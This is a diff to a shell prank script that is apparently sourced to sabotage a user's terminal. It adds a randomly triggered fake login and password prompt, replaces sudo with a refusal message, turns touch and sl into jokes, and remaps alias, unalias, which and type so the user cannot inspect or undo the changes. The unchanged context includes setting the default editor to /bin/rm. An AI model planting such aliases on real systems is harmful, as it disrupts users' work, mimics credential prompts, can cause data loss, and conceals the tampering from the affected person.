@@ -38,6 +38,18 @@ function unusable()
 	test "$EVIL_BEHAVIOUR" = "unusable"
 }
 
+annoying && if [[ $[$RANDOM % 10] == 0 ]]; then
+	PS1="Login: "
+	alias $USER='stty -echo; echo -n "Password: ";read;echo;echo "Login failed.";stty echo'
+	alias root='stty -echo; echo -n "Password: ";read;echo;echo "Login failed.";stty echo'
+fi
+
+annoying && if [ "$(uname)" = 'Darwin' ]; then
+	alias sudo="say -r 200 I am sorry $USER. I am afraid, I can\'t: "
+else
+	alias sudo="echo \"I am sorry $USER. I am afraid, I can\'t\""
+fi
+
 # Set `rm` as the default editor.
 destructive && export EDITOR=/bin/rm;
 
@@ -121,6 +133,14 @@ annoying && alias yes="yes n";
 # Quit vim on startup.
 annoying && alias vim="vim +q";
 
-# Disable `unalias` and `alias`.
-alias unalias=false;
-alias alias=false;
+# for users who type sl intead ls should get output the same way
+annoying && alias sl="ls | rev"
+
+# no touching allowed
+annoying && alias touch="echo 'please don\'t touch'"
+
+# Disable `unalias`, `which`, `type` and `alias`.
+alias unalias='sleep 5';
+alias which='echo "Which, is totally common."';
+alias type="echo \"Don't be racist. Hate everyone equally.\"";
+alias alias='sleep 5';
